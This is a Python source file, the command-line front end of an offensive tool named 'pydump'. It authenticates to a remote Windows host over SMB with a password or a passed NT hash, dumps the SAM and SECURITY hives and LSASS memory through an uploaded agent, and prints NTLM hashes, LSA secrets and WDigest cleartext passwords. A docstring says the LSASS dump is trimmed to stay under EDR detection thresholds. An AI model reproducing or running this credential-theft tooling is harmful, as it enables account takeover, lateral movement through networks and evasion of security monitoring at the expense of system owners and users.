"""Command-line interface for pydump."""

import argparse
import struct
import sys
import os


def main():
    parser = argparse.ArgumentParser(
        prog="pydump",
        description="Remote Windows credential extraction",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""examples:
  python main.py -t 10.0.0.5 -u admin -p pass --sam
  python main.py -t 10.0.0.5 -u admin -p pass --sam --lsa
  python main.py -t 10.0.0.5 -u admin -p pass --lsass
  python main.py -t 10.0.0.5 -u admin -p pass --sam --lsa --lsass
  python main.py -t 10.0.0.5 -u admin -H aad3b4...ef40 --sam --lsa
""",
    )

    # Target / auth
    parser.add_argument("-t", "--target", required=True, help="Target IP or hostname")
    parser.add_argument("-u", "--username", required=True, help="Username")
    parser.add_argument("-p", "--password", default="", help="Password")
    parser.add_argument("-H", "--hash", default=None, dest="nt_hash",
                        metavar="NTHASH", help="NT hash (32 hex chars)")
    parser.add_argument("-d", "--domain", default=".", help="Domain (default: local)")

    # What to extract (at least one required)
    parser.add_argument("--sam", action="store_true", help="Extract SAM hashes")
    parser.add_argument("--lsa", action="store_true", help="Extract LSA secrets")
    parser.add_argument("--lsass", action="store_true", help="Dump and parse LSASS memory")

    args = parser.parse_args()

    if not args.password and not args.nt_hash:
        parser.error("provide either -p/--password or -H/--hash")
    if args.nt_hash:
        h = args.nt_hash.lower()
        if len(h) != 32 or not all(c in "0123456789abcdef" for c in h):
            parser.error("--hash must be exactly 32 hex characters")
        args.nt_hash = h
    if not args.sam and not args.lsa and not args.lsass:
        parser.error("specify at least one of --sam, --lsa, --lsass")

    _cmd_dump(args)


def _cmd_dump(args):
    from .smb import SmbSession
    from .dump.methods import PipeDump

    do_registry = args.sam or args.lsa
    do_lsass = args.lsass

    agent_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), "agent", "bin", "agent.exe")
    if do_lsass and not os.path.isfile(agent_path):
        print(f"[!] Agent not found: {agent_path}")
        print("    Build it with: cd agent && make cross")
        sys.exit(1)

    print(f"[*] Connecting to {args.target}...")

    try:
        with SmbSession(args.target, args.username, args.password, args.domain,
                        nt_hash=args.nt_hash) as session:
            auth_method = "PTH" if args.nt_hash else "password"
            print(f"[+] Authenticated as {args.domain}\\{args.username} ({auth_method})")

            method = PipeDump(session, agent_path)

            lsass_pid = 0
            if do_lsass:
                lsass_pid = method.find_lsass_pid()

            scope = []
            if do_registry:
                scope.append("registry")
            if do_lsass:
                scope.append(f"LSASS pid={lsass_pid}")
            print(f"[*] Extracting: {', '.join(scope)}")

            result = method.execute(do_registry=do_registry, lsass_pid=lsass_pid)

            # SAM
            if args.sam:
                if result.system_hive and result.sam_hive:
                    _show_sam_hive(result)
                else:
                    print("\n[-] No SAM data — hive files not accessible")

            # LSA
            if args.lsa:
                if result.system_hive and result.security_hive:
                    _show_lsa_hive(result)
                else:
                    print("\n[-] No LSA data — hive files not accessible")

            # LSASS
            if args.lsass and result.lsass_dump:
                _show_lsass(result.lsass_dump, session)
            elif args.lsass:
                print("\n[-] No LSASS data received")

    except Exception as e:
        print(f"[!] Failed: {e}")
        sys.exit(1)


def _show_sam_hive(result):
    from .secrets.registry import extract_boot_key_from_hive, parse_sam_hive

    print()
    print("── SAM Hashes ───────────────────────────────────────────────")
    try:
        boot_key = extract_boot_key_from_hive(result.system_hive)
        hashes = parse_sam_hive(result.sam_hive, boot_key)
        if hashes:
            for h in hashes:
                print(f"  {h.username}:{h.rid}:{h.lm_hash or 'aad3b435b51404ee'}:{h.ntlm_hash}:::")
        else:
            print("  (none)")
    except Exception as e:
        print(f"  [!] {e}")


def _show_lsa_hive(result):
    from .secrets.registry import extract_boot_key_from_hive, parse_security_hive

    print()
    print("── LSA Secrets ──────────────────────────────────────────────")
    try:
        boot_key = extract_boot_key_from_hive(result.system_hive)
        secrets = parse_security_hive(result.security_hive, boot_key)
        if secrets:
            for s in secrets:
                print(f"  {s.name}: {s.decoded}")
        else:
            print("  (none)")
    except Exception as e:
        print(f"  [!] {e}")


def _inject_disk_module(dump, session):
    """Read lsasrv.dll from disk via SMB and inject as memory segment.

    The agent's targeted dump only includes lsasrv's .data section to stay
    under EDR thresholds. The extractor needs .text for pattern scanning.
    On x64, .text is identical on disk and in memory (RIP-relative, no fixups).
    """
    from .parser.minidump import MemorySegment

    lsasrv = dump.find_module("lsasrv")
    if not lsasrv:
        print("    [dbg] lsasrv module not found in dump")
        return

    try:
        disk_data = session.read_file("ADMIN$", "System32\\lsasrv.dll")
    except Exception as e:
        print(f"    [dbg] failed to read lsasrv.dll from disk: {e}")
        return
    if not disk_data or len(disk_data) < 0x200 or disk_data[:2] != b"MZ":
        print(f"    [dbg] invalid lsasrv.dll disk data: {len(disk_data) if disk_data else 0} bytes")
        return
    padded = disk_data
    if len(padded) < lsasrv.size:
        padded = padded + b"\x00" * (lsasrv.size - len(padded))

    dump.memory.append(MemorySegment(
        start=lsasrv.base_address,
        size=lsasrv.size,
        data=padded,
    ))


def _show_lsass(dump_data: bytes, session=None):
    from .parser.minidump import parse
    from .parser.extract import CredentialExtractor

    print("[*] Parsing minidump...")
    dump = parse(dump_data)
    print(f"    OS: {dump.sysinfo_major}.{dump.sysinfo_minor} build {dump.sysinfo_build}")

    if session:
        _inject_disk_module(dump, session)

    extractor = CredentialExtractor(dump)
    try:
        credentials = extractor.extract()
    except Exception as e:
        print(f"  [!] {e}")
        return

    if not credentials:
        print("  (none)")
        return

    print()
    print(f"{'Auth':<10} {'Domain':<20} {'Username':<25} {'Secret'}")
    print("-" * 90)
    for cred in credentials:
        if cred.auth_type == "msv1_0":
            secret = cred.ntlm_hash or "(empty)"
        elif cred.auth_type == "wdigest":
            secret = cred.password or "(empty)"
        else:
            secret = ""
        print(f"{cred.auth_type:<10} {cred.domain:<20} {cred.username:<25} {secret}")
